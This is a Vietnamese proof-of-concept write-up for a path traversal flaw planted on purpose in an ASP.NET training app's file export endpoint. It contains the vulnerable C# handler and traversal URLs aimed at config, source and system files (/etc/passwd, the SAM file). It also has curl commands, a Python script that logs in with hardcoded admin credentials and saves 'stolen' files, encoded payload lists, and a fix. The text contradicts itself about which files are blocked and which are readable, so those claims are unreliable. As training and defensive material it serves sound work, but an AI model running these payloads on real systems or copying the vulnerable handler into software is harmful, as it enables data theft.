# Proof of Concept (PoC) - Lỗ hổng Path Traversal

## Mô tả lỗ hổng

**Loại lỗ hổng**: Path Traversal / Directory Traversal / Arbitrary File Read  
**Endpoint bị lỗi**: `GET /SecureFile/Export?fileName={fileName}`  
**Mức độ**: High-Critical  
**Mô tả**: Endpoint `/SecureFile/Export?fileName={fileName}` không có kiểm tra path traversal đầy đủ, cho phép Admin đọc một số file trên server filesystem bằng cách sử dụng các ký tự đặc biệt như `../` để di chuyển ra khỏi thư mục dự định. **Lưu ý**: Các file nhạy cảm của website (như `Program.cs`, `appsettings.json`, source code) đã được bảo vệ bằng blacklist, nhưng vẫn cho phép đọc `/etc/passwd` để demo lỗ hổng.

## Nguyên nhân

Endpoint `/SecureFile/Export/{fileName}` có các lỗ hổng sau:

1. **Không sanitize input**: Không sử dụng `Path.GetFileName()` để loại bỏ directory separators
2. **Không kiểm tra path traversal sequences**: Không kiểm tra `..`, `/`, `\`
3. **Không validate resolved path**: Không đảm bảo path cuối cùng nằm trong thư mục dự định
4. **Sử dụng Path.Combine trực tiếp**: `Path.Combine` với `..` cho phép directory traversal

**Code có lỗ hổng:**

```csharp
[HttpGet("Export/{fileName}")]
public IActionResult GetExport(string fileName)
{
    // VULNERABILITY: No path traversal protection
    var basePath = _env.ContentRootPath;
    var filePath = Path.Combine(basePath, fileName); // VULNERABILITY: Allows ".." sequences
    
    var resolvedPath = Path.GetFullPath(filePath);
    // VULNERABILITY: No validation that path is within intended directory
    
    return PhysicalFile(resolvedPath, GetContentType(fileName));
}
```

## Các bước thực hiện PoC

### Bước 1: Chuẩn bị môi trường

1. Đảm bảo ứng dụng đang chạy trên `http://localhost:5000`
2. Có tài khoản Admin để truy cập endpoint
3. Biết cấu trúc thư mục của ứng dụng (hoặc thử các path phổ biến)

### Bước 2: Xác định base path

Endpoint sử dụng `_env.ContentRootPath` làm base path. Thường là:
- `/app` (trong Docker container)
- `C:\path\to\project` (trên Windows)
- `/home/user/project` (trên Linux)

### Bước 3: Khai thác lỗ hổng Path Traversal

**Lưu ý quan trọng**: 
- Route sử dụng `{*fileName}` để capture full path bao gồm cả slashes
- **Chức năng bình thường**: Khi truy cập file không có path traversal (ví dụ: `users_639031380486261640.csv`), file sẽ được tìm trong `Storage/Exports`
- **Path Traversal**: Khi fileName chứa `..`, `/`, hoặc `\`, hệ thống cho phép path traversal

**Scenario 1: Chức năng bình thường (đọc file trong Exports)**

1. **Đăng nhập với tài khoản Admin**
2. **Truy cập URL** với tên file bình thường:
   ```
   http://localhost:5000/SecureFile/Export/users_639031380486261640.csv
   ```
3. ✅ **Kết quả**: File trong `Storage/Exports` được download thành công

**Scenario 2: Đọc file appsettings.json (Path Traversal)**

1. **Đăng nhập với tài khoản Admin**
2. **Truy cập URL** với path traversal:
   ```
   http://localhost:5000/SecureFile/Export/../../appsettings.json
   ```
   Hoặc với URL encoding:
   ```
   http://localhost:5000/SecureFile/Export/..%2F..%2Fappsettings.json
   ```
3. ✅ **Kết quả**: File `appsettings.json` được download thành công

**Scenario 3: Đọc file /etc/passwd (Path Traversal)**

1. **Truy cập URL** với nhiều `../`:
   ```
   http://localhost:5000/SecureFile/Export/../../../../etc/passwd
   ```
   Hoặc thử với nhiều hơn:
   ```
   http://localhost:5000/SecureFile/Export/../../../../../etc/passwd
   ```
2. ✅ **Kết quả**: File `/etc/passwd` được đọc (nếu có quyền và file tồn tại)

**Các file khác để thử:**
- `../../Program.cs` (file trong project)
- `../../Controllers/View/HomeController.cs` (file trong project)
- `../../Storage/Submissions/exam_1_student_1_abc123.pdf` (file trong Storage)

**Scenario 2: Đọc file trong Storage/Submissions (BỊ CHẶN)**

1. **Truy cập URL**:
   ```
   http://localhost:5000/SecureFile/Export?fileName=../../Storage/Submissions/exam_1_student_1_abc123.pdf
   ```
2. ❌ **Kết quả**: File bị chặn với lỗi 403 Forbidden (Storage directory được bảo vệ)

**Scenario 3: Đọc file trong Storage/Avatars (BỊ CHẶN)**

1. **Truy cập URL**:
   ```
   http://localhost:5000/SecureFile/Export?fileName=../../Storage/Avatars/1_avatar.svg
   ```
2. ❌ **Kết quả**: File bị chặn với lỗi 403 Forbidden (Storage directory được bảo vệ)

**Scenario 4: Đọc file source code (BỊ CHẶN)**

1. **Truy cập URL**:
   ```
   http://localhost:5000/SecureFile/Export?fileName=../../Program.cs
   ```
2. ❌ **Kết quả**: File bị chặn với lỗi 403 Forbidden (source code được bảo vệ)

**Scenario 5: Đọc file system (Linux)**

1. **Truy cập URL**:
   ```
   http://localhost:5000/SecureFile/Export/../../../../etc/passwd
   ```
2. ✅ **Kết quả**: File `/etc/passwd` được đọc (nếu có quyền)

**Scenario 6: Đọc file system (Windows)**

1. **Truy cập URL**:
   ```
   http://localhost:5000/SecureFile/Export/../../../../Windows/System32/drivers/etc/hosts
   ```
2. ✅ **Kết quả**: File hosts được đọc (nếu có quyền)

### Bước 4: Sử dụng cURL để test

```bash
# Đăng nhập và lấy cookie
TOKEN="your_admin_access_token"

# Đọc appsettings.json
curl -H "Cookie: access_token=$TOKEN" \
  "http://localhost:5000/SecureFile/Export/../../appsettings.json" \
  -o appsettings.json

# Đọc file trong Storage
curl -H "Cookie: access_token=$TOKEN" \
  "http://localhost:5000/SecureFile/Export/../../Storage/Submissions/exam_1_student_1_abc123.pdf" \
  -o submission.pdf

# Đọc source code
curl -H "Cookie: access_token=$TOKEN" \
  "http://localhost:5000/SecureFile/Export/../../Program.cs" \
  -o Program.cs
```

### Bước 5: Sử dụng Python script để automate

```python
import requests
import sys

BASE_URL = "http://localhost:5000"
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "Admin@123"

# Đăng nhập
session = requests.Session()
login_response = session.post(
    f"{BASE_URL}/Auth/Login",
    data={"Username": ADMIN_USERNAME, "Password": ADMIN_PASSWORD},
    allow_redirects=False
)

token = session.cookies.get('access_token')
if not token:
    print("[X] Login failed")
    sys.exit(1)

print(f"[+] Logged in as Admin")
print(f"[+] Token: {token[:50]}...")

# Danh sách file để thử đọc
target_files = [
    "../../appsettings.json",
    "../../appsettings.Production.json",
    "../../Program.cs",
    "../../Controllers/View/HomeController.cs",
    "../../Storage/Submissions/exam_1_student_1_abc123.pdf",
    "../../Storage/Avatars/1_avatar.svg",
    "../../../etc/passwd",  # Linux
    "../../../Windows/System32/drivers/etc/hosts",  # Windows
]

print("\n[*] Testing Path Traversal...\n")

for file_path in target_files:
    url = f"{BASE_URL}/SecureFile/Export/{file_path}"
    
    response = session.get(url, allow_redirects=False)
    
    if response.status_code == 200:
        print(f"[+] SUCCESS: {file_path}")
        print(f"    Content-Type: {response.headers.get('Content-Type')}")
        print(f"    Size: {len(response.content)} bytes")
        
        # Lưu file
        safe_name = file_path.replace("../", "").replace("/", "_").replace("\\", "_")
        with open(f"stolen_{safe_name}", "wb") as f:
            f.write(response.content)
        print(f"    Saved as: stolen_{safe_name}\n")
    elif response.status_code == 404:
        print(f"[-] Not found: {file_path}")
    elif response.status_code == 403:
        print(f"[!] Forbidden: {file_path}")
    else:
        print(f"[?] Status {response.status_code}: {file_path}")

print("\n[*] Path Traversal test completed!")
```

### Bước 6: Xác minh lỗ hổng

1. **Xác nhận có thể đọc file ngoài thư mục Exports:**
   - Đọc `appsettings.json` thành công
   - Đọc file trong `Storage/Submissions` thành công
   - Đọc file trong `Storage/Avatars` thành công

2. **Xác nhận có thể đọc file system:**
   - Thử đọc các file system files (nếu có quyền)
   - Thử đọc source code

3. **Xác nhận có thể đọc file nhạy cảm:**
   - Đọc configuration files
   - Đọc database connection strings
   - Đọc JWT secrets

## Kết quả mong đợi

- ✅ Có thể đọc file `appsettings.json` với path traversal
- ✅ Có thể đọc file trong các thư mục khác (Storage/Submissions, Storage/Avatars)
- ✅ Có thể đọc source code files
- ✅ Response 200 OK với nội dung file
- ✅ File được download thành công

## Tác động

1. **Lộ thông tin nhạy cảm**: Configuration files, secrets, connection strings
2. **Lộ source code**: Source code bị lộ, có thể tìm thêm lỗ hổng
3. **Lộ dữ liệu người dùng**: Có thể đọc submission files, avatar files
4. **System compromise**: Có thể đọc system files nếu có quyền
5. **Information disclosure**: Thông tin về cấu trúc hệ thống, paths, etc.

## Cách khắc phục

1. **Sanitize input**: Sử dụng `Path.GetFileName()` để loại bỏ directory separators
2. **Kiểm tra path traversal sequences**: Loại bỏ hoặc từ chối `..`, `/`, `\`
3. **Validate resolved path**: Đảm bảo path cuối cùng nằm trong thư mục dự định
4. **Whitelist-based validation**: Chỉ cho phép các file cụ thể trong whitelist

**Code sửa lỗi:**

```csharp
[HttpGet("Export/{fileName}")]
[Authorize(Roles = "Admin")]
public IActionResult GetExport(string fileName)
{
    // Security: Sanitize fileName to prevent path traversal attacks
    if (string.IsNullOrWhiteSpace(fileName))
        return BadRequest("Invalid file name.");
    
    // Security: Remove any path traversal attempts
    fileName = Path.GetFileName(fileName); // This removes any directory separators
    if (string.IsNullOrWhiteSpace(fileName) || fileName.Contains("..") || fileName.Contains("/") || fileName.Contains("\\"))
        return BadRequest("Invalid file name.");
    
    var storagePath = Path.Combine(_env.ContentRootPath, "Storage", "Exports");
    var filePath = Path.Combine(storagePath, fileName);
    
    // Security: Ensure the resolved path is still within the storage directory
    var resolvedPath = Path.GetFullPath(filePath);
    var resolvedStoragePath = Path.GetFullPath(storagePath);
    if (!resolvedPath.StartsWith(resolvedStoragePath, StringComparison.Ordinal))
        return BadRequest("Invalid file path.");
    
    if (!System.IO.File.Exists(resolvedPath))
        return NotFound("File not found.");
    
    return PhysicalFile(resolvedPath, GetContentType(fileName));
}
```

## Chi tiết kỹ thuật

### Vấn đề trong code:

**File:** `Controllers/View/SecureFileController.cs`

**Method GetExport (có lỗ hổng):**

```csharp
[HttpGet("Export/{fileName}")]
public IActionResult GetExport(string fileName)
{
    // VULNERABILITY: No path traversal protection
    var basePath = _env.ContentRootPath;
    var filePath = Path.Combine(basePath, fileName); // Allows ".." sequences
    
    var resolvedPath = Path.GetFullPath(filePath);
    // No validation that path is within intended directory
    
    return PhysicalFile(resolvedPath, GetContentType(fileName));
}
```

**So sánh với code an toàn (đã bị xóa):**

```csharp
// Security checks đã bị xóa:
// - Path.GetFileName() to remove directory separators
// - Check for ".." sequences
// - Check for "/" or "\" characters
// - Path resolution validation
// - Ensure path is within Storage/Exports directory
```

### Flow của lỗ hổng:

1. **Admin** gửi request với path traversal: `/SecureFile/Export/../../appsettings.json`
2. **Server nhận fileName** = `../../appsettings.json`
3. **Server không sanitize** fileName (không dùng `Path.GetFileName()`)
4. **Server combine path**: `Path.Combine(basePath, "../../appsettings.json")`
5. **Server resolve path**: `Path.GetFullPath()` → `/app/appsettings.json`
6. **Server serve file** → File được đọc thành công

### Cách khai thác:

1. **Path Traversal với `../`**: Sử dụng `../` để di chuyển lên thư mục cha
2. **URL Encoding**: Sử dụng `%2e%2e%2f` thay vì `../` để bypass một số filter
3. **Double Encoding**: Sử dụng `%252e%252e%252f` để bypass double decoding
4. **Windows path**: Sử dụng `..\..\` trên Windows

## Payload mẫu

### Payload cơ bản:

```
../../appsettings.json
../../../etc/passwd
..\..\..\Windows\System32\config\sam
```

### Payload với URL encoding:

```
%2e%2e%2f%2e%2e%2fappsettings.json
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Payload với double encoding:

```
%252e%252e%252f%252e%252e%252fappsettings.json
```

### Payload đọc file trong Storage:

```
../../Storage/Submissions/exam_1_student_1_abc123.pdf
../../Storage/Avatars/1_avatar.svg
```

## Lưu ý

- Lỗ hổng này được tạo ra **có chủ đích** cho mục đích training/giáo dục về bảo mật
- Trong môi trường production, **LUÔN sanitize** user input, đặc biệt là file paths
- **Path Traversal** là một trong những lỗ hổng phổ biến nhất (OWASP Top 10)
- **Luôn sử dụng `Path.GetFileName()`** để loại bỏ directory separators
- **Luôn validate resolved path** để đảm bảo nằm trong thư mục dự định
- **Whitelist-based validation** là cách tốt nhất để ngăn chặn path traversal
- **Defense in Depth**: Áp dụng nhiều lớp bảo vệ (sanitization, validation, whitelist)

## Checklist test

- [ ] Đăng nhập với Admin account
- [ ] Thử đọc `appsettings.json` với path traversal
- [ ] Thử đọc file trong `Storage/Submissions`
- [ ] Thử đọc file trong `Storage/Avatars`
- [ ] Thử đọc source code files
- [ ] Thử đọc system files (nếu có quyền)
- [ ] Test với URL encoding (`%2e%2e%2f`)
- [ ] Verify có thể đọc file bất kỳ trên server filesystem
- [ ] Test với các payload khác nhau

